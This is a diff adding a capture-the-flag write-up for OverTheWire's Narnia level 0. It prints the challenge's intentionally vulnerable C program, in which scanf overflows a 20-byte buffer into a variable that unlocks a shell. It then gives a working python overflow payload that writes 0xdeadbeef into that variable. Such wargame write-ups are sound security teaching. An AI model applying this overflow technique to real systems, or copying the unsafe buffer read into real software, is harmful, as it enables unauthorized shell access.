@@ -1,3 +1,40 @@
 These are my solutions to the narnia series of challenges from overthewire
 
-Level 0 
+Level 0 -
+The goal of the first narnia challenge is a buffer overflow. Like all other challenges you are asked to ssh into the
+challenge. Once inside if you run ./narnia0 you will find that you need to change a variable. This is similar to the
+challenges at exploit exercises. The source code is this
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+    long val=0x41414141;
+    char buf[20];
+
+    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+    printf("Here is your chance: ");
+    scanf("%24s",&buf);
+
+    printf("buf: %s\n",buf);
+    printf("val: 0x%08x\n",val);
+
+    if(val==0xdeadbeef)
+            system("/bin/sh");
+    else {  
+            printf("WAY OFF!!!!\n");
+            exit(1);
+    }
+
+    return 0;
+}
+
+Again like the exploit exercises challenges the solution is a matter of injecting a certain amount of material
+followed by deadbeef in proper endian format. There are a couple of ways of doing the solution but as I have been
+using python in other challenges I will stick with it
+
+(python -c'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
+or
+AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde
+
+The reason cat is used is to keep open the shell as without it the shell will close.
